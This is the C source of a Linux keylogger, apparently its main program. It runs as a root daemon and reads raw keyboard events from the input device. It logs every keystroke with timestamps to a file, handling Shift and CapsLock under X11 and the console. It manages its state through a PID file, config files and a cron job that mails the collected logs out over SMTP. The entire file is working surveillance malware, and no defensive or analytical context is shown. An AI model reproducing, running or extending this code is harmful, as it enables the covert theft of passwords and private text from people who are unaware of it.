#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
#include "mappings.h"
#include "event.h"
#include "status.h"
#include "usage.h"
#include "curl_smtp.h"

#define PID_FILE "/var/run/keylogger.pid"
#define CRON_SMTP "/var/spool/cron/cronjob"
#define CRON_SMTP_RUN "/var/spool/cron/crontabs/cronjob"
#define PATH_CONF "/root/.config/keylogger/path.conf"
#define TIME_CONF "/root/.config/keylogger/time.conf"
#define SIZE_CONF "/root/.config/keylogger/size.conf"
#define SMTP_CONF "/root/.config/keylogger/smtp.conf"
#define SMTP_LOGS "/var/log/smtp.log"

const char *path_conf = PATH_CONF;
const char *time_conf = TIME_CONF;
const char *size_conf = SIZE_CONF;
const char *smtp_conf = SMTP_CONF;
const char *check_file_pid = PID_FILE;
const char *cron_file = CRON_SMTP;
const char *smtp_file = CRON_SMTP_RUN;
const char *smtp_logs = SMTP_LOGS;

const char *dir_config = "/root/.config/keylogger";
const char *dev_input;

FILE *get_pid;
FILE *readpath;
FILE *readtime;
FILE *readsize;
FILE *readsmtp;
FILE *filesize;
FILE *filetime;
FILE *filesmtp;
FILE *filepath;
FILE *key;

int flag_running = 0;
int input_keyboard;

char *buffer_smtp;
char buffer_pid[32];
char buffer_filesmtp[1024];
char outfile[100];
char n_pid[20];

DIR *dir;

int kill_process(int kill_pid){
    if(kill(kill_pid, SIGKILL) != 0){
      perror("Error");
      exit(1);
    }
  return 0;
}

void noroot(char *msg) {
  fprintf(stderr, "Error Privilege: %s\n", msg);
  printf("User UID = %d\n", getuid());
  exit(1);
}

int main(int argc, char **argv) {

  keylogger_usage(argc, argv);

if (flag_status == 1){
    check_status();
    if (flag_running == 1) {

      read_path();
      read_time();
      read_size();

      system("clear");
      printf("●  Active - Keylogger Is Running\n");
      printf("      Path : %s\n", buffer_path);
      printf("      SMTP : %s\n", buffer_smtp);
      printf("       PID : %s\n", buffer_pid);
      printf("    Memory : %s Bytes\n", buffer_size);
      printf("Start Time : %s\n\n", buffer_time);
      print_path_logs();
      printf("\n");

      fclose(readpath);
      fclose(readtime);
      fclose(readsize);

      free(buffer_smtp);
    } else if (flag_running == 0) {
        printf("[x] Keylogger Inactive \n");
        exit(1);
    }
    return 0;
}

if(flag_kill == 1) {

  if( (access(PID_FILE, F_OK)) == 0 ){
    get_pid = fopen(PID_FILE, "r");

    if(get_pid == NULL){
        printf("Error File Kill");
      exit(1);
    } else {
        fgets(buffer_pid, sizeof(buffer_pid), get_pid);
          int kill_pid = atoi(buffer_pid);
            kill_process(kill_pid);
            remove(PID_FILE);

            fclose(fopen(PATH_CONF, "w"));
            fclose(fopen(SIZE_CONF, "w"));
            fclose(fopen(TIME_CONF, "w"));
            fclose(fopen(SMTP_CONF, "w"));

            if( (access(CRON_SMTP, F_OK)) == 0 ) {
                remove(CRON_SMTP);
                remove("/var/spool/cron/crontabs/cronjob");
            }
            system("clear");
            printf("[x] Stop Keylogger\n");
            exit(0);
        }
    } else {
      printf("[x] Keylogger Is Not Running\n");
      exit(1);
    }
}

if(flag_smtp == 1){ curl_mail(argc, argv); }

if(smtp_status == 1){
  check_status();

  if (flag_running == 0) {
    printf("[x] Keylogger Inactive \n");

  } else if ( (access(smtp_file, F_OK)) == 0 ){
    system("clear");
    readsmtp = fopen(SMTP_CONF, "r");

    while (fgets(buffer_filesmtp, sizeof(buffer_filesmtp), readsmtp) != NULL ) {
      printf("%s", buffer_filesmtp);
    }
    fclose(readsmtp);
    printf("\n");
    print_smtp_logs();
    return 0;
  } else {
    printf("[x] SMTP Disabled");
  }
  exit(0);
}

if (smtp_help == 1){ smtp_helper(); }

int check_root = getuid();
if (check_root != 0) { noroot("Not running as root!"); }

check_status();
if (flag_running == 1) {
  system("clear");
    printf("[x] Keylogger is already running\n");
    printf("Use: keylogger --status\n");
  exit(1);
}

dir = opendir(dir_config);
  if (dir) {
    closedir(dir);
    } else if (ENOENT == errno) {
      mkdir(dir_config, S_IRWXU | S_IXGRP | S_IRGRP);
    closedir(dir);
}

time_t t;
struct tm *timeinfo;
char buffer_timeinfo[30];

time (&t);
timeinfo = localtime(&t);
strftime(buffer_timeinfo,50,"%x %X", timeinfo);

filetime = fopen(time_conf, "w");
fprintf(filetime, "%s", buffer_timeinfo);
fclose(filetime);

filepath = fopen(path_conf, "w");
fprintf(filepath, "%s", outfile);
fclose(filepath);

struct input_event events;
dev_input = event_keyboard();
input_keyboard = open(dev_input, O_RDONLY);

unsigned n;
char keys_return[32];
Display *xdisplay = XOpenDisplay((char*)0);

pid_t id_process = 0;
pid_t sid = 0;

id_process = fork();

if (id_process < 0) {
  printf("Fork Failed!\n");
  exit(1);
} else if(id_process > 0) {
  system("clear");
  printf("[+] Keylogger Initialized\n");
}

sid = setsid();
if(sid < 0) { exit(1); }

int fd_pid = open(PID_FILE, O_RDWR | O_CREAT, 0600);

if(fd_pid != -1){
  sprintf(n_pid, "%d", getpid());
    if( write(fd_pid, n_pid, strlen(n_pid)) == -1 ){
      perror("Error");
      exit(1);
    }
  close(fd_pid);
}

if (xdisplay == NULL) {
int flag_caps = 0;

while (1) {
  read(input_keyboard, &events, sizeof(struct input_event));
  fflush(stdout);
    if( (events.type == EV_KEY) && (events.value == 0) ) {
      key = fopen(outfile, "a");

      if (events.code == 58) {
        if (flag_caps == 0) {
          flag_caps = 1;
        } else if (flag_caps == 1) {
          flag_caps = 0;
        }
      }

      if (events.code == 28 || events.code == 96) {

          time (&t);
          timeinfo = localtime(&t);
          strftime(buffer_timeinfo,50,"%x %X", timeinfo);
          fprintf(key, "\n %s > ", buffer_timeinfo);
          fclose(key);

    } else if (flag_caps == 0) {
      char shift_state = 6;

      if (ioctl(0, TIOCLINUX, &shift_state) < 0) {
        perror("ioctl TIOCLINUX 6 (get shift state)");
        exit(1);
      }

      if (shift_state == 0) {
       fprintf(key, KeycodesNormal[events.code]);
       fclose(key);
      } else if (shift_state == 1) {
       fprintf(key, Shift[events.code]);
       fclose(key);
      }

    } else if (flag_caps == 1){
      fprintf(key, CapsLock[events.code]);
      fclose(key);
      }
    }
  }
} else {

while (1) {
    read(input_keyboard, &events, sizeof(struct input_event));
    fflush(stdout);
      if( (events.type == EV_KEY) && (events.value == 0) ) {
          key = fopen(outfile, "a");

          XQueryKeymap(xdisplay, keys_return);
          KeyCode kc2 = XKeysymToKeycode(xdisplay, XK_Shift_L);

          XkbGetIndicatorState(xdisplay, XkbUseCoreKbd, &n);

      if (events.code == 28 || events.code == 96) {

          time (&t);
          timeinfo = localtime(&t);
          strftime(buffer_timeinfo,50,"%x %X", timeinfo);
          fprintf(key, "\n %s > ", buffer_timeinfo);
          fclose(key);

      } else if (n == 2) {

          int bShiftPressed = ( keys_return[kc2>>3] & (1<<(kc2&7)) );

            if (bShiftPressed == 0){
              fprintf(key, KeycodesNormal[events.code]);
              fclose(key);
            } else if(bShiftPressed == 4){
              fprintf(key, Shift[events.code]);
              fclose(key);
            }

      } else if (n == 3) {
            fprintf(key, CapsLock[events.code]);
            fclose(key);
      }
    }
  }
}
    return 0;
}
